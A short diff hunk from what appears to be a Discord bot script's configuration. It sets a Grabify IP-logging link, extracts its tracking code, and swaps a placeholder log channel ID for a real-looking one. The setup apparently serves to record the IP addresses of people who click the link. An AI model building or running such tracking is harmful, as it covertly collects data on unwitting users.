@@ -19,7 +19,7 @@ GRABIFY_LINK = "https://grabify.link/AC6BBB"
 TRACKING_CODE = GRABIFY_LINK.replace("https://grabify.link/", "")
 
 # CHANNEL ID FOR LOGS
-LOG_CHANNEL_ID = 123456789012345678  # ← REPLACE WITH YOUR CHANNEL ID!
+LOG_CHANNEL_ID = 1541000634210324510  # ← REPLACE WITH YOUR CHANNEL ID!
 
 # ========================================
 # 2. BOT
